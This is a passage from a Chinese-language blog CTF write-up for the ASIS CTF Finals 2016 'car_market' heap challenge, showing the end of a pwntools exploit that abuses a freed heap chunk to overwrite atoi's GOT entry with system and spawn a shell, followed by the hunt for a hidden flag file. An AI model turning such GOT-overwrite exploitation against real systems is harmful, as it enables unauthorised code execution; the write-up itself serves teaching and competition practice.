array)...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>]</span><br><span class="line">    data   = [p64(<span class="number">0x1111</span>) + p64(heap_base+<span class="number">0x10</span>)]</span><br><span class="line">    sel_car_cust(<span class="number">16</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free &amp; reallocate heap_base+0x10 , now we can control the car array </span></span><br><span class="line">    <span class="comment"># after we control the car array, overite car[14] and make it point to atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car array...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>]</span><br><span class="line">    data   = [<span class="string">&quot;A&quot;</span>*<span class="number">0x20</span>+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])]</span><br><span class="line">    sel_car_cust(<span class="number">15</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;overwriting atoi&#x27;s got...&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># select car</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="string">&quot;14&quot;</span>) <span class="comment"># input index</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;2&quot;</span>) <span class="comment"># set model (atoi&#x27;s got)</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;model\n&quot;</span>, p64(system))</span><br><span class="line">    r.sendline(<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;get shell !&quot;</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+<p>寫完 exploit 之後拿來跑，然後就 timeout 了… </p>
+<p>傳到 trello 請 Ann Tsai 幫忙跑之後就去睡了，結果醒來時卻發現這題還沒過 @@<br>原來是 Ann Tsai 在拿到 shell 之後找不到 flag ?! </p>
+<p>結果用她的機器進行測試的時候發現 flag 藏在一個頗猥瑣的位置</p>
+<pre>
+$ ls -la
+total 40
+drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
+drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
+lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -> /dev/null
+-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
+-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
+-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
+-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
+-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
+-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
+</pre>
+
+<p>看來主辦方是想惡搞我們參賽者。沒關係，cat flag 下一下結束這回合:  </p>
+<pre>
+$ cat ._flag
+cat: ._flag: No such file or directory
+</pre>
+
+<p>(☉д⊙)………WTF ?!</p>
+<p>主辦方不知道下了什麼巫術，讓我們看到了 flag 檔名卻不讓我們 cat flag 的內容。之後進行了一連串 command line 的嘗試，例如 <code>for f in .*;do cat $f;done</code>，不過還是無法讀取。最後是 ddaa 用 <code>cat .*</code> 讓 flag 噴出來的……到現在還是匪夷所思…..</p>
+<p>flag: <code>ASIS&#123;a0b8813fc566836c8b5f37fe68c684c5&#125;</code></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/heap/" rel="tag"># heap</a>
+          
+            <a href="/tags/ASIS-CTF-Finals-2016/" rel="tag"># ASIS CTF Finals 2016</a>
+          
+            <a href="/tags/Use-After-Free/" rel="tag"># Use After Free</a>
+          
+            <a href="/tags/fastbin/" rel="tag"># fastbin</a>
+          
+            <a href="/tags/off-by-one/" rel="tag"># off-by-one</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/ASIS-CTF-Finals-2016-shadow-99/" rel="next" title="[ASIS CTF Finals 2016] shadow 99">
+                <i class="fa fa-chevron-left"></i> [ASIS CTF Finals 2016] shadow 99
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/yet-another-solution-for-javascript-i18n/" rel="prev" title="又是一种用于 JavaScript 的前端国际化方案">
+                又是一种用于 JavaScript 的前端国际化方案 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">1451</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">71</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">914</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5358884258"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Info"><span class="nav-number">1.</span> <span class="nav-text">Info</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyzing"><span class="nav-number">2.</span> <span class="nav-text">Analyzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Laird Lau</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
